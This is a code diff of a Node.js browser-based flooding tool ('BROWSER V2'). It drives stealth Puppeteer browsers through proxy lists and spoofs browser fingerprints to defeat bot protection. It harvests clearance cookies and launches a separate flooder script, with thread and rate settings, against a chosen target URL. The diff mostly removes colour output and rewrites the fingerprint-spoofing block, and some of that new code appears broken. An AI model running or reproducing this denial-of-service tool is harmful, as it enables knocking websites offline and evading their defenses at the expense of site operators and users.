@@ -4,7 +4,6 @@ const puppeteerStealth = require('puppeteer-extra-plugin-stealth');
 const { spawn } = require('child_process');
 const { exec } = require('child_process');
 const pLimit = require('p-limit');
-const chalk = require('chalk');
 
 puppeteer.use(puppeteerStealth());
 
@@ -20,11 +19,11 @@ const threads = parseInt(threadsInput, 10);
 if (!targetURL || !threadsInput || isNaN(threads) || threads <= 0 || !proxyFile || isNaN(duration) || isNaN(thread) || !rates) {
     console.clear();
     console.log(`
-        ${chalk.cyanBright('BROWSER V2')} | Updated: May 10, 2025
+        BROWSER V2 | Updated: May 10, 2025
         
-        ${chalk.blueBright('Usage:')}
-            ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads_browser> <threads_flood> <rates> <proxy>`)}
-            ${chalk.yellowBright(`Example: node ${process.argv[1]} https://example.com 400 30 2 30 proxy.txt`)}
+        Usage:
+            node ${process.argv[1]} <target> <duration> <threads_browser> <threads_flood> <rates> <proxy>
+            Example: node ${process.argv[1]} https://example.com 400 30 2 30 proxy.txt
     `);
     process.exit(1);
 }
@@ -34,18 +33,6 @@ if (!/^https?:\/\//i.test(targetURL)) {
 }
 
 const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
-
-const colors = {
-    COLOR_RED: "\x1b[31m",
-    COLOR_GREEN: "\x1b[32m",
-    COLOR_YELLOW: "\x1b[33m",
-    COLOR_RESET: "\x1b[0m",
-    COLOR_BRIGHT_BLUE: "\x1b[94m"
-};
-
-function colored(colorCode, text) {
-    console.log(colorCode + text + colors.COLOR_RESET);
-}
 
 function generateRandomNumber(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -58,37 +45,17 @@ function randomElement(element) {
 const rd = generateRandomNumber(100, 135);
 const userAgents = [
     `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`
+    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
+    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`
 ];
 
 async function spoofFingerprint(page) {
     await page.evaluateOnNewDocument(() => {
         Object.defineProperty(window, 'screen', {
-            value: { width: 1920, height: 1080, availWidth: 1920, availHeight: 1080, colorDepth: 24, pixelDepth: 24 },
-            writable: true
+            value: { width: 1920, height: 1080, availWidth: 1920, availHeight: 1080, colorDepth: 64, pixelDepth: 64 }
         });
-        Object.defineProperty(navigator, 'webdriver', { get: () => false });
-        Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'], writable: true });
-        Object.defineProperty(navigator, 'language', { value: 'en-US', writable: true });
-        Object.defineProperty(navigator, 'platform', { value: 'Win32', writable: true });
-        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4, writable: true });
-        Object.defineProperty(navigator, 'deviceMemory', { value: 8, writable: true });
-        Object.defineProperty(navigator, 'doNotTrack', { value: null, writable: true });
-        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0, writable: true });
-        Object.defineProperty(navigator, 'vendor', { value: 'Google Inc.', writable: true });
-        Object.defineProperty(navigator, 'plugins', {
-            value: [{ name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' }],
-            writable: true
-        });
-        Object.defineProperty(navigator, 'connection', {
-            value: { downlink: 10, effectiveType: '4g', rtt: 50 },
-            writable: true
-        });
-        const originalImage = window.Image;
-        Object.defineProperty(window, 'Image', {
-            value: function () { return new originalImage(); },
-            writable: true
+        Object.defineProperty(navigator, 'userAgent', {
+            value: userAgent
         });
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
@@ -96,10 +63,42 @@ async function spoofFingerprint(page) {
             const originalGetParameter = gl.getParameter;
             gl.getParameter = function(parameter) {
                 if (parameter === gl.VENDOR) return 'WebKit';
-                if (parameter === gl.RENDERER) return 'Apple GPU';
-                return originalGetParameter.call(this, parameter);
+                else if (parameter === gl.RENDERER) return 'Apple GPU';
+                else return originalGetParameter.call(this, parameter);
             };
         }
+        Object.defineProperty(navigator, 'plugins', {
+            value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
+        });
+        Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
+        Object.defineProperty(navigator, 'webdriver', { get: () => false });
+        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
+        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
+        Object.defineProperty(document, 'cookie', {
+            configurable: true,
+            enumerable: true,
+            get: function() { return ''; },
+            set: function() {}
+        });
+        Object.defineProperty(navigator, 'cookiesEnabled', {
+            configurable: true,
+            enumerable: true,
+            get: function() { return true; },
+            set: function() {}
+        });
+        Object.defineProperty(window, 'localStorage', {
+            configurable: true,
+            enumerable: true,
+            value: {
+                getItem: function() { return null; },
+                setItem: function() {},
+                removeItem: function() {}
+            }
+        });
+        Object.defineProperty(navigator, 'doNotTrack', { value: null });
+        Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
+        Object.defineProperty(navigator, 'language', { value: 'en-US' });
+        Object.defineProperty(navigator, 'vendorSub', { value: '' });
     });
 }
 
@@ -191,7 +190,7 @@ async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxR
         if (attempt <= maxRetries) {
             return await launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
         }
-        colored(colors.COLOR_RED, `[ERROR] Browser failed: ${error.message}`);
+        console.log(`[ERROR] Browser failed: ${error.message}`);
         return null;
     } finally {
         if (browser) await browser.close().catch(() => {});
@@ -206,7 +205,7 @@ async function startThread(targetURL, browserProxy) {
 
         cookieCount++;
         const cookies = `[INFO] Total solve: ${cookieCount}\n[INFO] Title: ${response.title}\n[INFO] Proxy: ${response.browserProxy}\n[INFO] Cookies: ${response.cookies}\n[INFO] Useragent: ${response.userAgent}`;
-        colored(colors.COLOR_GREEN, cookies);
+        console.log(cookies);
 
         spawn('node', [
             'g.js',
@@ -219,24 +218,24 @@ async function startThread(targetURL, browserProxy) {
             response.userAgent
         ]);
     } catch (error) {
-        colored(colors.COLOR_RED, `[ERROR] Thread failed: ${error.message}`);
+        console.log(`[ERROR] Thread failed: ${error.message}`);
     }
 }
 
 async function main() {
     console.clear();
-    colored(colors.COLOR_GREEN, '[INFO] Running...');
-    colored(colors.COLOR_GREEN, `[INFO] Target: ${targetURL}`);
-    colored(colors.COLOR_GREEN, `[INFO] Duration: ${duration} seconds`);
-    colored(colors.COLOR_GREEN, `[INFO] Threads Browser: ${threads}`);
-    colored(colors.COLOR_GREEN, `[INFO] Threads Flooder: ${thread}`);
-    colored(colors.COLOR_GREEN, `[INFO] Rates Flooder: ${rates}`);
-    colored(colors.COLOR_GREEN, `[INFO] Proxies: Loading... | Filename: ${proxyFile}`);
+    console.log('[INFO] Running...');
+    console.log(`[INFO] Target: ${targetURL}`);
+    console.log(`[INFO] Duration: ${duration} seconds`);
+    console.log(`[INFO] Threads Browser: ${threads}`);
+    console.log(`[INFO] Threads Flooder: ${thread}`);
+    console.log(`[INFO] Rates Flooder: ${rates}`);
+    console.log(`[INFO] Proxies: Loading... | Filename: ${proxyFile}`);
 
     const proxies = await readProxiesFromFile(proxyFile);
-    colored(colors.COLOR_GREEN, `[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`);
+    console.log(`[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`);
     if (proxies.length === 0) {
-        colored(colors.COLOR_RED, '[ERROR] No proxies found in file. Exiting.');
+        console.log('[ERROR] No proxies found in file. Exiting.');
         process.exit(1);
     }
 
@@ -244,27 +243,27 @@ async function main() {
     const tasks = proxies.map(browserProxy => limit(() => startThread(targetURL, browserProxy)));
     await Promise.all(tasks);
 
-    colored(colors.COLOR_YELLOW, "[INFO] Time's up! Cleaning up...");
+    console.log('[INFO] Time\'s up! Cleaning up...');
     exec('pkill -f g.js', (err) => {
         if (err && err.code !== 1) {
-            colored(colors.COLOR_RED, '[ERROR] Failed to kill g.js processes');
+            console.log('[ERROR] Failed to kill g.js processes');
         } else {
-            colored(colors.COLOR_GREEN, '[INFO] Successfully killed g.js processes');
+            console.log('[INFO] Successfully killed g.js processes');
         }
     });
     exec('pkill -f chrome', (err) => {
         if (err && err.code !== 1) {
-            colored(colors.COLOR_RED, '[ERROR] Failed to kill Chrome processes');
+            console.log('[ERROR] Failed to kill Chrome processes');
         } else {
-            colored(colors.COLOR_GREEN, '[INFO] Successfully killed Chrome processes');
+            console.log('[INFO] Successfully killed Chrome processes');
         }
     });
     await sleep(5);
-    colored(colors.COLOR_GREEN, '[INFO] Exiting');
+    console.log('[INFO] Exiting');
     process.exit(0);
 }
 
 main().catch(err => {
-    colored(colors.COLOR_RED, `[ERROR] Main function error: ${err.message}`);
+    console.log(`[ERROR] Main function error: ${err.message}`);
     process.exit(1);
 });
